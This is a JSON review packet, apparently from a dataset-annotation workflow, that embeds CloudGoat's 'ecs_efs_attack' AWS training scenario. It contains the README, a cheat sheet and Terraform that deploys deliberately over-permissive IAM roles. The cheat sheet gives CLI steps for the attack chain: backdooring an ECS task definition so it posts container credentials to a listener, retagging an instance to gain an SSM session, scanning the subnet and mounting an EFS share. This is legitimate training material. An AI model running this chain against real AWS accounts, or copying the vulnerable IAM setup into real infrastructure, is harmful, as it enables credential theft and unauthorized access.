@@ -1,0 +1,187 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "302769ba038fda16713414a302646b482f6e0b9454a34a9344228f19b05401cc",
+  "case_id": "cloudgoat:aws:ecs_efs_attack",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:ecs_efs_attack",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "ecs_efs_attack",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/cheat_sheet.md"
+    ],
+    "terraform_file_count": 10,
+    "has_cheat_sheet": true,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/",
+    "review_score": 0,
+    "independence_group": "cloudgoat-scenario:ecs_efs_attack",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/README.md",
+      "member_sha256": "10fc082caa69908f4fc1f6a13a68d11fe692232e544facc958dd5880d2df5348",
+      "bytes": 1576,
+      "content_kind": "md",
+      "text": "# Scenario: ecs_efs_attack\n\n**Size:** Large\n\n**Difficulty:** Hard\n\n**Command:** `$ ./cloudgoat.py create ecs_efs_attack`\n\n## Scenario Resources\n\n- 1 VPC with:\n\t- EC2 x 2\n\t- 1 ECS Cluster\n\t- 1 ECS Service \n\t- 1 EFS\n\n## Scenario Start(s)\n\n1. SSH access to \"Ruse_Box\" EC2\n\n## Scenario Goal(s)\n\nMount the \"cg-efs-[CG_ID]\" efs and obtain the flag.\n\n## Summary\n\nStarting with accessing the \"ruse\" EC2 the user leverages the instance profile to backdoor the running ECS container. Using the backdoored container the attacker can retrieve credentials from the container metadata API. These credentials allow the attacker to start a session on any EC2 with the proper tags set. The attacker uses their permissions to change the tags on the Admin EC2 and starts a session. Once in the Admin EC2 the attacker will port scan the subnet for an open EFS to mount. Once mounted the attacker can retrieve the flag from the elastic file system.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](assets/diagram.png)\n\n## Route Walkthrough \n\n1. Access the \"Ruse_Box\" ec2 using the provided access key.\n2. From the ec2 enumerate permission. Then list available ec2 and note how the tags are configured.\n3. From the current ec2 enumerate existing ecs cluster and backdoor the existing task definition.\n4. Update the existing service in the ecs cluster to execute the payload.\n5. From the container credentials use the SSM:StartSession privilege to access the admin_box.\n6. Port scan the subnet to find available efs and mount.\n\n**A cheat sheet for this route is available [here](./cheat_sheet.md).**\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/cheat_sheet.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/cheat_sheet.md",
+      "member_sha256": "c08c6167c0a35bb4e47c9edf4b09dd9b5e740f922bf52df857b5e651e0776d78",
+      "bytes": 2116,
+      "content_kind": "md",
+      "text": "1. Connect to the start ec2 \"Ruse_Box\" using the public IP and SSH key provided.\n\n    `ssh -i cloudgoat ubuntu@<IP ADDRESS>`\n\n2. Configure the role credentials \n\n    `aws configure --profile ruse`\n\n3. List the privileges \n`aws iam list-policies --profile ruse`\n\n4. List ec2 instances \n\n    `aws ec2 describe-instances --profile ruse `\n\n5. List all available ECS clusters \n\n    `aws ecs list-clusters --profile ruse`\n\n6. List services in cloudgoat cluster\n\n    `aws ecs list-services --cluster <CLUSTER NAME> --profile ruse`\n\n7. Download task definition \n\n    `aws ecs describe-task-definition --task-definition <TASK_NAME>:<VERSION> --profile ruse > task_def.json `\n\n8. Download template to register a new task\n\n    `aws ecs register-task-definition --generate-cli-skeleton --profile ruse > task_template.json`\n\n9. Now use task_def.json to fill out template.json with the desired payload. Reference our blog for details [here](https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/)\n\n10. Now register the template to replace the currently running task.\n\n    `register-task-definition --cli-input-json file://task_template.json  --profile ruse`\n\n11. Update the ECS service with the newly registered task definition.\n\n    `aws ecs update-service --cluster <CLUSTER NAME> --service <SERVICE NAME> --task-definition <NEW TASK DEFINITION NAME>`\n\n12. Wait for the task to run and POST the credentials to your listener\n\n13. With the new creds add them to \"ruse_box\"\n\n    `aws configure --profile ecs`\n\n14. Modify admin ec2 tags\n\n    `aws ec2 create-tags --resources <INSTANCE ID> --tags Key=StartSession,Value=true`\n\n15. Using ecs creds start a session on admin ec2 \n\n    `aws ssm start-session --target <INSTANCE ID> --profile ecs`\n\n16. Looking at the ec2 instances we see the admin ec2 only has a single port open. We Nmap scan this port.\n\n    `nmap -Pn -P 2049 --open 10.10.10.0/24 `\n\n17. Mount discovered ec2 \n\n    `cd /mnt`\n`sudo mkdir /efs`\n`sudo mount -t nfs4 -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport <IP ADDRESS OF EFS>:/ efs`\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/manifest.yml",
+      "member_sha256": "d037d71d016093893703e3b367ab073c7ea393ffd3cd94c55ddb0075756bf0ba",
+      "bytes": 1050,
+      "content_kind": "yml",
+      "text": "---\n  # The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: ecs_efs_attack\n  # The name of the author(s), comma-separated\n- author: Rhino Security Labs, Sebastian Mora (Ruse)\n  # The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 2.0\n  # Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        Starting with an ssh key the attacker accesses an open ec2 instance. From this instance, the attacker has access to parts of ECS. Abusing these privileges the attacker can backdoor an existing task definition to privileges escalate into the instance role of the container. Using these the attacker can the new privileges to modify the tags on the admin ec2.\n        Once the tags are modified they can use ssm:StartSession to access the ec2. Once in the Admin EC2, the attacker can scan for ef2 and mount it to win.\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 06-17-2020\n...",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/data_sources.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/data_sources.tf",
+      "member_sha256": "a12b46c87aafb60c3698d6ab933de8b8a86d79462ac690ac1851550f5b4a1ff1",
+      "bytes": 161,
+      "content_kind": "tf",
+      "text": "#AWS Account Id\ndata \"aws_caller_identity\" \"aws-account-id\" {}\n\nlocals {\n  default_tags = {\n    Stack    = var.stack-name\n    Scenario = var.scenario-name\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/ec2.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/ec2.tf",
+      "member_sha256": "6eb6272679ffd19cfecaeb4e4aca354e84ecb586f61a3674f31bd1ec41c8fd1e",
+      "bytes": 4498,
+      "content_kind": "tf",
+      "text": "# Security Groups\nresource \"aws_security_group\" \"cg-ec2-ssh-security-group\" {\n  name        = \"cg-ec2-ssh-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EC2 Instance over SSH\"\n  vpc_id      = aws_vpc.cg-vpc.id\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n  tags = merge(local.default_tags, {\n    Name = \"cg-ec2-ssh-${var.cgid}\"\n  })\n}\n\nresource \"aws_security_group\" \"cg-ec2-efs-security-group\" {\n  name        = \"cg-ec2-efs-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EFS\"\n  vpc_id      = aws_vpc.cg-vpc.id\n  ingress {\n    from_port = 2049\n    to_port   = 2049\n    protocol  = \"tcp\"\n    cidr_blocks = [\n      \"10.10.10.0/24\"\n    ]\n  }\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n  tags = merge(local.default_tags, {\n    Name = \"cg-ec2-efs-${var.cgid}\"\n  })\n}\n\nresource \"aws_security_group\" \"cg-ec2-http-listener-security-group\" {\n  name        = \"cg-ec2-http-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for http server\"\n  vpc_id      = aws_vpc.cg-vpc.id\n  ingress {\n    from_port = 8080\n    to_port   = 8080\n    protocol  = \"tcp\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n  tags = merge(local.default_tags, {\n    Name = \"cg-ec2-http-${var.cgid}\"\n  })\n}\n\n# AWS Key Pair\nresource \"aws_key_pair\" \"cg-ec2-key-pair\" {\n  key_name   = \"cg-ec2-key-pair-${var.cgid}\"\n  public_key = file(var.ssh-public-key-for-ec2)\n}\n\n# EC2 Instance \"ruse-box\"\nresource \"aws_instance\" \"cg-ruse-ec2\" {\n  ami                         = \"ami-0a313d6098716f372\"\n  instance_type               = \"t3.micro\"\n  iam_instance_profile        = aws_iam_instance_profile.cg-ec2-ruse-instance-profile.name\n  subnet_id                   = aws_subnet.cg-public-subnet-2.id\n  associate_public_ip_address = true\n\n  # Open ssh to whitelist ip and 8080 extenally \n  vpc_security_group_ids = [\n    aws_security_group.cg-ec2-ssh-security-group.id,\n    aws_security_group.cg-ec2-http-listener-security-group.id\n  ]\n  key_name = aws_key_pair.cg-ec2-key-pair.key_name\n  root_block_device {\n    volume_type           = \"gp2\"\n    volume_size           = 8\n    delete_on_termination = true\n  }\n\n\n  user_data = <<-EOF\n      #! /bin/bash\n      sudo snap start amazon-ssm-agent  \n      sudo apt-get update\n      sudo apt-get install -y unzip\n      curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\"\n      unzip awscliv2.zip\n      sudo ./aws/install --bin-dir /usr/local/bin --install-dir /usr/local/aws-cli --update\n      curl \"https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb\" -o \"session-manager-plugin.deb\"\n      sudo dpkg -i session-manager-plugin.deb\n      EOF\n\n  volume_tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} EC2 Instance Root Device\"\n  })\n  tags = merge(local.default_tags, {\n    Name         = \"cg-ruse-ec2-${var.cgid}\"\n    StartSession = \"true\"\n  })\n}\n\nresource \"aws_instance\" \"cg-dev-ec2\" {\n  ami                         = \"ami-0a313d6098716f372\"\n  instance_type               = \"t3.micro\"\n  iam_instance_profile        = aws_iam_instance_profile.cg-efs-admin-instance-profile.name\n  subnet_id                   = aws_subnet.cg-public-subnet-1.id\n  associate_public_ip_address = true\n\n  # Open port for efs \n  vpc_security_group_ids = [\n    aws_security_group.cg-ec2-efs-security-group.id\n  ]\n\n  root_block_device {\n    volume_type           = \"gp2\"\n    volume_size           = 8\n    delete_on_termination = true\n  }\n\n  user_data = <<-EOF\n      #! /bin/bash\n      sudo snap start amazon-ssm-agent  \n      sudo apt-get update\n      sudo apt-get install -y nfs-common\n      sudo apt-get install -y unzip\n      curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\"\n      unzip awscliv2.zip\n      sudo ./aws/install --bin-dir /usr/local/bin --install-dir /usr/local/aws-cli --update\n      sudo apt install nmap\n\n      EOF\n\n  volume_tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} EC2 Instance Root Device\"\n  })\n  tags = merge(local.default_tags, {\n    Name         = \"cg-admin-ec2-${var.cgid}\"\n    StartSession = \"false\"\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/ecs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/ecs.tf",
+      "member_sha256": "ed119eb78aac5fbf53d873a6a3219195149e2e0a1726cc8e6002b8196fdb3487",
+      "bytes": 2845,
+      "content_kind": "tf",
+      "text": "resource \"aws_ecs_cluster\" \"cg-cluster\" {\n  name = \"cg-cluster-${var.cgid}\"\n  tags = local.default_tags\n}\n\nresource \"aws_ecs_task_definition\" \"cg-webapp\" {\n  family                   = \"webapp\"\n  requires_compatibilities = [\"FARGATE\"]\n  network_mode             = \"awsvpc\"\n  cpu                      = \"256\"\n  memory                   = \"512\"\n  task_role_arn            = aws_iam_role.cg-ecs-role.arn\n  execution_role_arn       = aws_iam_role.cg-ecs-role.arn\n\n  container_definitions = jsonencode(\n    [\n      {\n        name              = \"webapp\"\n        image             = \"httpd:2.4\"\n        essential         = true\n        cpu               = 128\n        memory            = 128\n        memoryReservation = 64\n        portMappings = [\n          {\n            containerPort = 80\n            hostPort      = 80\n            protocol      = \"tcp\"\n          }\n        ]\n        command = [\n          \"/bin/sh -c \\\"echo '<html> <head> <title>CloudGoat EC2 </title> <style>body {margin-top: 40px; background-color: #333;} </style> </head><body> <div style=color:white;text-align:center> <h1>CloudGoat ...</h1> <h2>Welcome!</h2> </div></body></html>' >  /usr/local/apache2/htdocs/index.html && httpd-foreground\\\"\"\n        ]\n        entryPoint = [\n          \"sh\",\n          \"-c\"\n        ]\n      }\n    ]\n  )\n\n  tags = local.default_tags\n}\n\n\ndata \"aws_ecs_task_definition\" \"cg-webapp\" {\n  task_definition = aws_ecs_task_definition.cg-webapp.family\n}\n\nresource \"aws_ecs_service\" \"cg-webapp\" {\n  name          = \"cg-webapp-${var.cgid}\"\n  cluster       = aws_ecs_cluster.cg-cluster.name\n  desired_count = 1\n  launch_type   = \"FARGATE\"\n\n  network_configuration {\n    security_groups  = [aws_security_group.cg-ecs-http-security-group.id]\n    subnets          = [aws_subnet.cg-public-subnet-1.id]\n    assign_public_ip = true\n  }\n\n  # Track the latest ACTIVE revision\n  task_definition = \"${aws_ecs_task_definition.cg-webapp.family}:${max(aws_ecs_task_definition.cg-webapp.revision, data.aws_ecs_task_definition.cg-webapp.revision)}\"\n\n  tags = merge(local.default_tags, {\n    Name = \"cg-ecs-${var.cgid}\"\n  })\n}\n\nresource \"aws_iam_policy_attachment\" \"cg-ecs-role-policy-attachment\" {\n  name = \"cg-ecs-role-policy-attachment-${var.cgid}\"\n  roles = [\n    aws_iam_role.cg-ecs-role.name\n  ]\n  policy_arn = aws_iam_policy.cg-ecs-role-policy.arn\n}\n\nresource \"aws_security_group\" \"cg-ecs-http-security-group\" {\n  name        = \"cg-ecs-http-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for ecs\"\n  vpc_id      = aws_vpc.cg-vpc.id\n  ingress {\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n  tags = merge(local.default_tags, {\n    Name = \"cg-ecs-http-${var.cgid}\"\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/efs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/efs.tf",
+      "member_sha256": "ab73bcf209a0901b96553e8e4fa17a1fbc6dd8572ad006f528958a288ba0c635",
+      "bytes": 711,
+      "content_kind": "tf",
+      "text": "resource \"aws_efs_file_system\" \"admin-backup\" {\n  tags = merge(local.default_tags, {\n    Name = \"cg-admin-backup-${var.cgid}\"\n  })\n}\n\nresource \"aws_efs_mount_target\" \"alpha\" {\n  file_system_id  = aws_efs_file_system.admin-backup.id\n  subnet_id       = aws_subnet.cg-public-subnet-1.id\n  security_groups = [aws_security_group.cg-ec2-efs-security-group.id]\n}\n\n# EFS access point used by lambda file system\nresource \"aws_efs_access_point\" \"admin_access_point\" {\n  file_system_id = aws_efs_file_system.admin-backup.id\n\n  root_directory {\n    path = \"/admin\"\n    creation_info {\n      owner_gid   = 1000\n      owner_uid   = 1000\n      permissions = \"777\"\n    }\n  }\n  posix_user {\n    gid = 1000\n    uid = 1000\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/iam.tf",
+      "member_sha256": "652b536a95aa99f4c9511713bd72d336a9b23bf87e703980af23b2f60fed9c06",
+      "bytes": 5475,
+      "content_kind": "tf",
+      "text": "\n###########  EC2 Roles ###############\n\nresource \"aws_iam_role\" \"cg-ec2-ruse-role\" {\n  name = \"cg-ec2-role-${var.cgid}\"\n  assume_role_policy = jsonencode(\n    {\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Action = \"sts:AssumeRole\"\n          Principal = {\n            Service = \"ec2.amazonaws.com\"\n          }\n          Effect = \"Allow\"\n          Sid    = \"\"\n        }\n      ]\n    }\n  )\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore\",\n    aws_iam_policy.cg-ec2-ruse-role-policy.arn\n  ]\n\n  tags = merge(local.default_tags, {\n    Name = \"cg-ec2-role-${var.cgid}\"\n  })\n}\n\nresource \"aws_iam_instance_profile\" \"cg-ec2-ruse-instance-profile\" {\n  name = \"cg-ecsTaskExecutionRole-instance-profile-${var.cgid}\"\n  role = aws_iam_role.cg-ec2-ruse-role.name\n}\n\n#IAM Admin Role\nresource \"aws_iam_role\" \"cg-efs-admin-role\" {\n  name = \"cg-efs-admin-role-${var.cgid}\"\n  assume_role_policy = jsonencode(\n    {\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Action = \"sts:AssumeRole\"\n          Principal = {\n            Service = \"ec2.amazonaws.com\"\n          }\n          Effect = \"Allow\"\n          Sid    = \"\"\n        }\n      ]\n    }\n  )\n  tags = merge(local.default_tags, {\n    Name = \"cg-ec2-efsUser-role-${var.cgid}\"\n  })\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore\",\n    aws_iam_policy.cg-efs-admin-role-policy.arn\n  ]\n}\n\nresource \"aws_iam_instance_profile\" \"cg-efs-admin-instance-profile\" {\n  name = \"cg-efs-admin-instance-profile-${var.cgid}\"\n  role = aws_iam_role.cg-efs-admin-role.name\n}\n\n###### IAM Lambda Role ######\nresource \"aws_iam_role\" \"cg-lambda-role\" {\n  name = \"cg-lambda-role-${var.cgid}\"\n\n  assume_role_policy = jsonencode(\n    {\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Action = \"sts:AssumeRole\"\n          Principal = {\n            Service = \"lambda.amazonaws.com\"\n          }\n          Effect = \"Allow\"\n          Sid    = \"\"\n        }\n      ]\n    }\n  )\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/AWSLambdaExecute\",\n    \"arn:aws:iam::aws:policy/service-role/AWSLambdaVPCAccessExecutionRole\",\n    \"arn:aws:iam::aws:policy/AmazonElasticFileSystemClientReadWriteAccess\"\n  ]\n\n  tags = merge(local.default_tags, {\n    Name = \"cg-lambda-role-${var.cgid}\"\n  })\n}\n\n#Iam Role Policy for ec2 \"ruse-box\"\nresource \"aws_iam_policy\" \"cg-ec2-ruse-role-policy\" {\n  name        = \"cg-ec2-ruse-role-policy-${var.cgid}\"\n  description = \"cg-ec2-ruse-role-policy-${var.cgid}\"\n  policy = jsonencode(\n    {\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Sid    = \"VisualEditor0\"\n          Effect = \"Allow\"\n          Action = [\n            \"ecs:Describe*\",\n            \"ecs:List*\",\n            \"ecs:RegisterTaskDefinition\",\n            \"ecs:UpdateService\",\n            \"iam:PassRole\",\n            \"iam:List*\",\n            \"iam:Get*\",\n            \"ec2:CreateTags\",\n            \"ec2:DescribeInstances\",\n            \"ec2:DescribeImages\",\n            \"ec2:DescribeTags\",\n            \"ec2:DescribeSnapshots\"\n          ]\n          Resource = \"*\"\n        }\n      ]\n    }\n  )\n\n  tags = merge(local.default_tags, {\n    Name = \"cg-ec2-ruse-role-policy-${var.cgid}\"\n  })\n}\n\nresource \"aws_iam_policy\" \"cg-efs-admin-role-policy\" {\n  name        = \"cg-efs-admin-role-policy-${var.cgid}\"\n  description = \"cg-efs-admin-role-policy-${var.cgid}\"\n  policy = jsonencode(\n    {\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Sid      = \"VisualEditor0\"\n          Effect   = \"Allow\"\n          Action   = \"elasticfilesystem:ClientMount\"\n          Resource = \"*\"\n        }\n      ]\n    }\n  )\n\n  tags = merge(local.default_tags, {\n    Name = \"cg-efs-admin-role-policy-${var.cgid}\"\n  })\n}\n\n\n################### ECS #####################\n\n\n\n#IAM Role\nresource \"aws_iam_role\" \"cg-ecs-role\" {\n  name = \"cg-ecs-role-${var.cgid}\"\n  assume_role_policy = jsonencode(\n    {\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Action = \"sts:AssumeRole\"\n          Principal = {\n            Service = \"ecs-tasks.amazonaws.com\"\n          }\n          Effect = \"Allow\"\n          Sid    = \"\"\n        }\n      ]\n    }\n  )\n\n  tags = merge(local.default_tags, {\n    Name = \"cg-ecs-role-${var.cgid}\"\n  })\n}\n\n#Iam Role Policy\nresource \"aws_iam_policy\" \"cg-ecs-role-policy\" {\n  name        = \"cg-ecs-role-policy-${var.cgid}\"\n  description = \"cg-ecs-role-policy-${var.cgid}\"\n  policy = jsonencode(\n    {\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Sid    = \"VisualEditor0\"\n          Effect = \"Allow\"\n          Action = [\n            \"ec2:DescribeImages\",\n            \"logs:CreateLogStream\",\n            \"ec2:DescribeInstances\",\n            \"ec2:DescribeTags\",\n            \"ecr:GetDownloadUrlForLayer\",\n            \"ecr:BatchGetImage\",\n            \"ecr:GetAuthorizationToken\",\n            \"ssm:TerminateSession\",\n            \"ec2:DescribeSnapshots\",\n            \"logs:PutLogEvents\",\n            \"ecr:BatchCheckLayerAvailability\"\n          ]\n          Resource = \"*\"\n        },\n        {\n          Sid      = \"VisualEditor1\"\n          Effect   = \"Allow\"\n          Action   = \"ssm:StartSession\"\n          Resource = \"arn:aws:ec2:*:*:instance/*\"\n          Condition = {\n            StringEquals = {\n              \"aws:ResourceTag/StartSession\" = \"true\"\n            }\n          }\n        }\n      ]\n    }\n  )\n\n  tags = merge(local.default_tags, {\n    Name = \"cg-ecs-role-policy-${var.cgid}\"\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/lambda.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/lambda.tf",
+      "member_sha256": "fb1d2fadb9c761c98009cce7907e5852a001b83e8e529f5759aa1ac97dfa8c34",
+      "bytes": 2621,
+      "content_kind": "tf",
+      "text": "# A lambda function connected to an EFS file system\nresource \"aws_lambda_function\" \"efs_upload\" {\n  # Explicitly declare dependency on EFS mount target. \n  # When creating or updating Lambda functions, mount target must be in 'available' lifecycle state.\n  depends_on = [\n    aws_efs_mount_target.alpha,\n    aws_efs_access_point.admin_access_point\n  ]\n\n  filename         = \"../assets/efs_upload.zip\"\n  function_name    = \"cg-efs_upload-${var.cgid}\"\n  role             = aws_iam_role.cg-lambda-role.arn\n  handler          = \"lambda_function.lambda_handler\"\n  source_code_hash = filebase64sha256(\"../assets/efs_upload.zip\")\n  runtime          = \"python3.8\"\n\n  file_system_config {\n    # EFS file system access point ARN\n    arn = aws_efs_access_point.admin_access_point.arn\n    # Local mount path inside the lambda function. Must start with '/mnt/'.\n    local_mount_path = \"/mnt/admin\"\n  }\n\n  vpc_config {\n    # Every subnet should be able to reach an EFS mount target in the same Availability Zone. Cross-AZ mounts are not permitted.\n    subnet_ids         = [aws_subnet.cg-public-subnet-1.id]\n    security_group_ids = [aws_security_group.cg-ec2-efs-security-group.id]\n  }\n\n  tags = local.default_tags\n}\n\n# Setup cloudwatch to trigger lambda every three minutes.filename\n# This method was used over aws_lambda_invocation due to a timing bug. When aws_lambda_invocation would run it would fail to mount \n# the efs. This was used as a work around. Idealy this function should only be called once but this method reduces the chance the file does not\n# get added to the efs. The old code will remain below until the timing bug is found and fixed. \n\nresource \"aws_cloudwatch_event_rule\" \"cg_insert_file_every_three_minutes\" {\n  name                = \"cg_every_three_minutes_${var.cgid}\"\n  description         = \"Fires every_three_minutes\"\n  schedule_expression = \"rate(3 minutes)\"\n\n  tags = local.default_tags\n}\n\nresource \"aws_cloudwatch_event_target\" \"cg_check_insert_file_every_three_minutes\" {\n  rule      = aws_cloudwatch_event_rule.cg_insert_file_every_three_minutes.name\n  target_id = \"lambda\"\n  arn       = aws_lambda_function.efs_upload.arn\n  input = jsonencode({\n    fname = \"flag.txt\"\n    text  = \"RmxhZzoge3todHRwczovL3lvdXR1LmJlL2RRdzR3OVdnWGNRfX0=\"\n  })\n}\n\nresource \"aws_lambda_permission\" \"allow_cloudwatch_to_call_insert_lambda\" {\n  statement_id  = \"AllowExecutionFromCloudWatch\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = aws_lambda_function.efs_upload.function_name\n  principal     = \"events.amazonaws.com\"\n  source_arn    = aws_cloudwatch_event_rule.cg_insert_file_every_three_minutes.arn\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_efs_attack/terraform/outputs.tf",
+      "member_sha256": "1beedc40ca6a8c9a2186b2786d8c9f248527d9faadcbf5c959a0e83e031be94b",
+      "bytes": 323,
+      "content_kind": "tf",
+      "text": "#Required: Always output the AWS Account ID\noutput \"cloudgoat_output_aws_account_id\" {\n  value = data.aws_caller_identity.aws-account-id.account_id\n}\n\noutput \"ruse_box_IP\" {\n  value = aws_instance.cg-ruse-ec2.public_ip\n}\n\noutput \"ssh_command\" {\n  value = \"ssh -i cloudgoat ubuntu@\\\\${aws_instance.cg-ruse-ec2.public_ip}\"\n}\n",
